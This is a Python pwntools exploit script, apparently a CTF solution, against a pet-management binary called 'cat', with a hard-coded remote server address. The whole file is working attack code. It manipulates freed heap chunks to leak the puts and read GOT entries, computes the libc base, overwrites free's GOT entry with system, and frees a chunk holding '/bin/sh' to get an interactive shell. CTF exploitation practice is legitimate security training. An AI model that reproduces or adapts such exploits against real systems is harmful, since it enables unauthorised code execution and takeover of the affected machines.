#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from parse import *
from pwn import *
context.log_level="debug"
pwn_file="./cat"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
os.environ["LD_LIBRRY_PATH"]="./"
puts_address=0
read_address=0
libc_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.62.40.102",6000)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("puts address:0x%x"%puts_address)
    log.debug("read address:0x%x"%read_address)
    log.debug("libc address:0x%x"%libc_address)
    pause()

def add(name,kind,age):
    conn.sendlineafter("which command?\n> ","1")
    conn.sendlineafter("What's the pet's name?\n> ",name)
    conn.sendlineafter("What's the pet's kind?\n> ",kind)
    conn.sendlineafter("How old?\n> ",str(age))

def edit(uid,name,kind,age,y):
    conn.sendlineafter("which command?\n> ","2")
    conn.sendlineafter("which id?\n> ",str(uid))
    conn.sendlineafter("What's the pet's name?\n> ",name)
    conn.sendlineafter("What's the pet's kind?\n> ",kind)
    conn.sendlineafter("How old?\n> ",str(age))
    conn.sendlineafter("Would you modify? (y)/n> ",y)

def show(uid):
    conn.sendlineafter("which command?\n> ","3")
    conn.sendlineafter("which id?\n> ",str(uid))
    name=conn.recvline(keepends=False)[len("name: "):]
    kind=conn.recvline(keepends=False)[len("kind: "):]
    age=conn.recvline(keepends=False)[len("age: "):]
    return name,kind,age

def dele(uid):
    conn.sendlineafter("which command?\n","5")
    conn.sendlineafter("which id?\n",str(uid))

add("1","1",1)
add("1","1",1)
add("/bin/sh\x00","1",1)
add("1","1",1)
dele(0)
dele(1)
edit(3,"1","1",1,'n')
add("1",p64(0x602100)[:3],1)
edit(3,"1",p64(elf.got["puts"])+p64(elf.got["read"]),1,'y')
puts,read,age=show(0)
puts_address=u64(puts.ljust(8,"\x00"))
read_address=u64(read.ljust(8,"\x00"))
libc_address=puts_address-libc.symbols["puts"]
edit(3,"1","1",1,'n')
add("1",p64(elf.got["free"])[:3],1)
edit(3,p64(libc_address+libc.symbols["system"])[:7],"1",1,'y')
dele(2)
conn.interactive()


